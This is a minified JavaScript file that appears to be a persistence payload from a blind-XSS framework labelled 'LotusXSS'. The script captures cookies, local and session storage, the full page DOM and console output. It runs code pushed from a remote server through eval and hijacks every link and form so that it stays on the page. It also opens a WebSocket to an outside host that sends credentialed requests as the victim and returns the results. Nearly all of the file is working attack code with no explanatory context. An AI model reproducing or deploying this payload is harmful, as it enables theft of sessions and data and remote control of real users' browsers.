var ez_we,ez_las="",ez_ind=null,ez_exi=false;function ez_pin(){try{if(ez_exi){return}ez_rD.type="ping",ez_rD.console=console.ez,ez_cb(ez_rD,ez_eva)}catch(e){}}function ez_stp(){null===ez_ind&&(ez_ind=window.setInterval(ez_pin,10000))}function ez_eva(input){return eval(input)}function eze_ini(){ra_hL(),ez_s(),ez_cb(ez_rD,ez_stp)}function ez_persist(){eze_ini(),ez_pin()}function ez_stop(){ez_exi=true}
if(!console.ez){var ms=["log","error","warn"];console.ez="";function ez_for(t,a){var d=new Date().toLocaleTimeString();return "["+d+" "+t+"] "+Array.prototype.join.call(a," ")+"\n";}function ez_wra(m,t){var dm0=console[m];console[m]=function (){try{console.ez=ez_for(t,arguments)+console.ez;dm0.apply(console,arguments);}catch(z){}};}for(var i=0;i<ms.length;i++){ez_wra(ms[i],ms[i].toUpperCase());}}
function ra_client(){var e="LotusXSS",r,t,a,n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",o;try{r="localStorage"in window&&null!==window.localStorage}catch(e){r=!1}r?(t=localStorage.getItem(e),t||(t=function(){for(var e="",r=0;r<16;r++)e+=n.charAt(Math.floor(Math.random()*n.length));return e}(),localStorage.setItem("LotusXSS",t))):(a=document.cookie.split(";").map(function(e){return e.trim()}).filter(function(r){return 0===r.indexOf(e)}),t=a.length>0?a[0].substring(e.length):null,t||(t=function(){for(var e="",r=0;r<16;r++)e+=n.charAt(Math.floor(Math.random()*n.length));return e}(),(o=new Date).setFullYear(o.getFullYear()+1),o=o.toUTCString().replace("GMT",""),document.cookie=e+"="+t+";expires="+o+";path=/;SameSite=lax;"));return t}
function ra_hL(){if(!ez_exi){ez_rD.type="init",ez_rD.console=console.ez;try{ez_rD.clientid=ra_client()}catch(t){ez_rD.clientid=""}try{ez_rD.method="persist"}catch(e){ez_rD.method=""}try{ez_rD.uri=ez_n(location.toString())}catch(r){ez_rD.uri=""}try{ez_rD.cookies=ez_n(document.cookie)}catch(c){ez_rD.cookies=""}try{""!=ez_las?ez_rD.referer=ez_n(ez_las):ez_rD.referer=ez_n(document.referrer)}catch(o){ez_rD.referer=""}try{ez_rD["user-agent"]=ez_n(navigator.userAgent)}catch(i){ez_rD["user-agent"]=""}try{ez_rD.origin=ez_n(location.origin)}catch(a){ez_rD.origin=""}try{ez_rD.localstorage=ez_n(window.localStorage)}catch(s){ez_rD.localstorage=""}try{ez_rD.sessionstorage=ez_n(window.sessionStorage)}catch(n){ez_rD.sessionstorage=""}try{ez_rD.dom=ez_n(document.documentElement.outerHTML),h()}catch(g){ez_rD.dom="",h()}}function h(){ra_r()}}
function ez_dol(t,e,n=""){if(ez_las=ez_n(location.toString()),""===n){var o=t.match(/<title[^>]*>([^<]+)<\/title>/);n=o?o[1]:""}document.title=n,window.history.pushState({html:t,pageTitle:n},"",e),document.getElementsByTagName("html")[0].innerHTML=t,window.scrollTo(0,0);var r=document.createElement("div");r.innerHTML=t;for(var a=r.getElementsByTagName("script"),i=0;i<a.length;i++){var l=document.createElement("script");for(var c of a[i].attributes)l.setAttribute(c.name,c.value);a[i].src?l.src=a[i].src:l.textContent=a[i].textContent,document.body.appendChild(l),l.parentNode.removeChild(l)}}
function ra_li(e){var r=document.createElement("a");if(r.href=e,r.hostname===window.location.hostname){if("#"===r.href.slice(-1)&&""===r.hash)return;if(""!==r.hash&&r.href.replace(r.hash,"")===window.location.href.split("#")[0]){var t=r.hash.replace("#",""),n=document.getElementById(t).offsetTop;window.history.pushState("",document.title,r.href),window.scrollTo(0,n);return}var o=new XMLHttpRequest;o.onload=function(){4==this.readyState&&(ez_dol(this.responseText,r.href),eze_ini())},o.onerror=function(){window.open(r.href,"_blank").focus()},o.open("GET",r.href),o.send()}else window.open(r.href,"_blank").focus()}
function ez_hac(e){var t=(e=e||window.event).target||e.srcElement,r=function(){for(var e=t;e;){if(e.tagName&&"a"===e.tagName.toLowerCase())return e;e=e.parentNode}return null}();r&&!r.href.startsWith("javascript:")&&(e.preventDefault?e.preventDefault():e.returnValue=!1,ra_li(r.getAttribute("href")))}
function ra_fo(t){(t=t||window.event).preventDefault?t.preventDefault():t.returnValue=!1;var e=document.createElement("a");if(e.href=this.action,e.hostname===window.location.hostname){var a=new XMLHttpRequest;a.open("POST",this.action,!0),a.onreadystatechange=function(){4==this.readyState&&(ez_dol(this.responseText,e.href),eze_ini())};var n=new FormData(this);if(this.dataset.clickedButtonName&&this.dataset.clickedButtonValue)n.append(this.dataset.clickedButtonName,this.dataset.clickedButtonValue);else{var i=this.querySelector('button[type="submit"], input[type="submit"]');i&&n.append(i.name,i.value)}a.send(n)}else{var o=window.open(this.action,"_blank");o&&o.focus&&(this.target="_blank",t.preventDefault&&t.preventDefault(),this.submit())}}function ez_hab(t){for(var e=t.target||t.srcElement;"button"!==e.tagName.toLowerCase()&&"input"!==e.tagName.toLowerCase();)e=e.parentNode;var a=e.form;a.dataset.clickedButtonName=e.name,a.dataset.clickedButtonValue=e.value}
function ez_hap(t){t.state&&t.state.html&&t.state.pageTitle&&(ez_dol(t.state.html,t.state.url,t.state.pageTitle),eze_ini())}function ez_fet(e,n="GET",t=null){return new Promise(function(o,r){var a=new XMLHttpRequest;a.open(n,e,!0),a.withCredentials=!0,a.responseType="arraybuffer","POST"===n&&t&&a.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),a.onreadystatechange=function(){if(4===a.readyState){var e=btoa(new Uint8Array(a.response).reduce((e,n)=>e+String.fromCharCode(n),""));o({statusCode:a.status,body:e,contentType:a.getResponseHeader("Content-Type")})}},a.onerror=function(){r(Error("Failed to load content"))},a.send(t)})}
function ez_soc(n,t=0){(!ez_we||ez_we.readyState!==WebSocket.OPEN)&&((ez_we=new WebSocket("wss://"+n)).onopen=function(){ez_we.send(JSON.stringify({clientid:ra_client(),pass:t,origin:location.host}))},ez_we.onmessage=function(n){let o=JSON.parse(n.data);("GET"==o.do||"POST"==o.do)&&ez_fet(o.request_uri,o.do,o.postData).then(function(n){ez_we.send(JSON.stringify({clientid:ra_client(),statusCode:n.statusCode,body:n.body,request_uri:o.request_uri,content_type:n.contentType,pass:t,origin:location.host}))}).catch(function(n){console.error(n)})},ez_we.onerror=function(n){},ez_we.onclose=function(){setTimeout(function(){ez_soc(n,t)},5e3)})}
function ra_r(){if(!ez_exi){for(var t=document.getElementsByTagName("a"),e=0;e<t.length;e++){var a=t[e];a.addEventListener?a.addEventListener("click",ez_hac,!1):a.attachEvent&&a.attachEvent("onclick",ez_hac)}for(var n=document.getElementsByTagName("form"),e=0;e<n.length;e++){var r=n[e],v=r.querySelectorAll('button[type="submit"], input[type="submit"]');r.addEventListener?r.addEventListener("submit",ra_fo,!1):r.attachEvent&&r.attachEvent("onsubmit",ra_fo);for(var i=0;i<v.length;i++){var c=v[i];c.addEventListener?c.addEventListener("click",ez_hab,!1):c.attachEvent&&c.attachEvent("onclick",ez_hab)}}window.addEventListener?window.addEventListener("popstate",ez_hap,!1):window.attachEvent&&window.attachEvent("onpopstate",ez_hap)}}